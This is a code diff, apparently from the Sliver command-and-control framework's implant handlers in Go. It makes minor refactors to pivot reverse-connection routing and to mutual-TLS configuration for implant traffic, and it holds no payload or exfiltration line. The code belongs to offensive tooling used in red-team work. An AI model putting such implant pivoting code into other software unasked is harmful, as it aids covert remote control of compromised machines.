@@ -3,13 +3,12 @@ package handlers
 import (
 	// {{if .Config.Debug}}
 	"log"
-	"net"
-
 	// {{end}}
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/pem"
 	"errors"
+	"net"
 
 	"github.com/golang/protobuf/proto"
 
@@ -133,7 +132,6 @@ func pivotMuxReverseOpenHandler(envelope *sliverpb.Envelope, connection *transpo
 		tIP := net.ParseIP(tp.Conn.RemoteAddr().String())
 
 		if pivotMuxReq.Route.Nodes[1].Addr == tIP.String() {
-
 			tp.Router.Handle(bon.Route(pivotMuxReq.Route.ID), func(conn net.Conn) {
 				go tp.HandleReverse(pivotMuxReq.Route.ID, conn)
 			})
@@ -258,7 +256,7 @@ func getTLSConfig(caCertPEM, certPEM, keyPEM []byte) (config *tls.Config, err er
 		return
 	}
 
-	tlsConfig := &tls.Config{
+	config = &tls.Config{
 		RootCAs:                  sliverCACertPool,
 		ClientAuth:               tls.RequireAndVerifyClientCert,
 		ClientCAs:                sliverCACertPool,
@@ -268,6 +266,6 @@ func getTLSConfig(caCertPEM, certPEM, keyPEM []byte) (config *tls.Config, err er
 		MinVersion:               tls.VersionTLS12,
 	}
 
-	tlsConfig.BuildNameToCertificate()
+	config.BuildNameToCertificate()
 	return
 }
